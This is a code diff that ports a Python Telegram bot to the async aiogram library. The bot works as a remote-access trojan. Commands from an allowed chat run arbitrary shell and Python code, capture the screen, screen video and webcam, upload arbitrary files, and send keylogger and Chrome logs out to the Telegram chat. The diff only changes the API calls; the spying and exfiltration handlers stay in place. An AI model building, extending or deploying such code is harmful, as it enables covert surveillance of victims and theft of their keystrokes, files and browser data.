@@ -1,75 +1,76 @@
+import asyncio
 import re
 import logging
-import os
 from commands import *
-from time import sleep
+from aiogram import Bot
+from aiogram.types import Message, FSInputFile
 
 
-def send_safe_message(chat_id, message):
+async def send_safe_message(bot: Bot, chat_id, message):
     while True:
         try:
-            bot.sendMessage(chat_id, message)
+            await bot.send_message(chat_id, message)
             break
         except:
-            sleep(1)
+            await asyncio.sleep(1)
 
 
-def send_safe_document(chat_id, file_path):
+async def send_safe_document(bot: Bot, chat_id, file_path):
     """Безопасная отправка документа с повторными попытками"""
     while True:
         try:
-            with open(file_path, 'rb') as f:
-                bot.sendDocument(chat_id, f)
+            await bot.send_document(chat_id, FSInputFile(file_path))
             break
         except:
-            sleep(1)
+            await asyncio.sleep(1)
 
 
-def send_file_and_cleanup(chat_id, file_path, response_text=None):
+async def send_file_and_cleanup(bot: Bot, chat_id, file_path, response_text=None):
     """Отправляет файл, удаляет его и возвращает текст ответа"""
-    send_safe_document(chat_id, file_path)
+    await send_safe_document(bot, chat_id, file_path)
     os.remove(file_path)
     return response_text
 
 
-def handle_message(msg):
-    chat_id = msg['chat']['id']
-    if not checkchat_id(chat_id):
+async def handle_message(message: Message, bot: Bot):
+    chat_id = message.chat.id
+    if not checkchat_id(str(chat_id)):
         return
 
-    if 'document' in msg:
+    if message.document:
         try:
-            file_id = msg['document']['file_id']
-            file_name = msg['document']['file_name']
+            file_id = message.document.file_id
+            file_name = message.document.file_name
             save_path = os.path.join(SCRIPTS_DIR, file_name)
-            bot.download_file(file_id, save_path)
-            bot.sendMessage(chat_id, f"Файл {file_name} успешно сохранён!")
+            file = await bot.get_file(file_id)
+            await bot.download_file(file.file_path, save_path)
+            await bot.send_message(chat_id, f"Файл {file_name} успешно сохранён!")
         except Exception as e:
             logging.error(f"Ошибка скачивания файла: {e}")
-            bot.sendMessage(chat_id, f"Ошибка: {e}")
+            await bot.send_message(chat_id, f"Ошибка: {e}")
         return
 
-    if 'photo' in msg:
+    if message.photo:
         try:
-            photo = msg['photo'][-1]
-            file_id = photo['file_id']
+            photo = message.photo[-1]
+            file_id = photo.file_id
 
             file_name = f"CLICK.png"
             save_path = os.path.join(SCRIPTS_DIR, file_name)
 
-            # Скачиваем фото
-            bot.download_file(file_id, save_path)
-            bot.sendMessage(chat_id, f"✅ Фото сохранено как {file_name} в папку {SCRIPTS_DIR}")
+            file = await bot.get_file(file_id)
+            await bot.download_file(file.file_path, save_path)
+            await bot.send_message(chat_id, f"✅ Фото сохранено как {file_name} в папку {SCRIPTS_DIR}")
 
         except Exception as e:
             logging.error(f"Ошибка скачивания фото: {e}")
-            bot.sendMessage(chat_id, f"❌ Ошибка сохранения фото: {e}")
+            await bot.send_message(chat_id, f"❌ Ошибка сохранения фото: {e}")
         return
 
-    if 'text' not in msg:
+    if not message.text:
         return
 
-    command = msg['text'].strip()
+    command = message.text.strip()
     response = ''
 
     try:
@@ -87,7 +88,7 @@ def handle_message(msg):
 
         elif command == '/ip_info':
             info = get_ip_info()
-            bot.sendLocation(chat_id, *info['location'])
+            await bot.send_location(chat_id, *info['location'])
             response = info['text']
 
         elif command.startswith('/cmd_exec'):
@@ -95,7 +96,7 @@ def handle_message(msg):
             temp_path = os.path.join(LOG_DIR, 'cmd_output.txt')
             with open(temp_path, 'w', encoding='utf-8') as f:
                 f.write(result)
-            send_file_and_cleanup(chat_id, temp_path)
+            await send_file_and_cleanup(bot, chat_id, temp_path)
             response = result[:700]
 
         elif command.startswith('/python_exec'):
@@ -105,24 +106,24 @@ def handle_message(msg):
             else:
                 path, result = python_exec(code)
                 if path:
-                    send_file_and_cleanup(chat_id, path)
+                    await send_file_and_cleanup(bot, chat_id, path)
                 else:
                     response = result
 
         elif command == '/capture_pc':
             path, response = capture_pc()
-            send_file_and_cleanup(chat_id, path)
+            await send_file_and_cleanup(bot, chat_id, path)
 
         elif command.startswith('/video_pc'):
             parts = command.replace('/video_pc', '').strip()
             seconds = min(int(parts) if parts else 30, 500)
             path, response = record_screen(seconds)
-            send_file_and_cleanup(chat_id, path)
+            await send_file_and_cleanup(bot, chat_id, path)
 
         elif command == '/capture_webcam':
             path = capture_webcam()
             if path:
-                send_file_and_cleanup(chat_id, path)
+                await send_file_and_cleanup(bot, chat_id, path)
             else:
                 response = 'Ошибка захвата с камеры'
 
@@ -161,7 +162,7 @@ def handle_message(msg):
             path = command.replace('/download', '').strip()
             file_path = download_file(path)
             if file_path:
-                send_safe_document(chat_id, file_path)
+                await send_safe_document(bot, chat_id, file_path)
             else:
                 response = f'Файл не найден: {path}'
 
@@ -196,11 +197,11 @@ def handle_message(msg):
             response = reboot()
 
         elif command == '/keylogs':
-            send_safe_document(chat_id, KEYLOG_FILE)
+            await send_safe_document(bot, chat_id, KEYLOG_FILE)
             get_keylog_file()
 
         elif command == '/user_log':
-            send_safe_document(chat_id, LOG_FILE)
+            await send_safe_document(bot, chat_id, LOG_FILE)
             get_user_log_file()
 
         elif command == '/chrome_log':
@@ -224,6 +225,5 @@ def handle_message(msg):
         response = f'⚠️ Ошибка: {e}'
 
     if response:
-        send_safe_message(chat_id, response)
-
+        await send_safe_message(bot, chat_id, response)
 
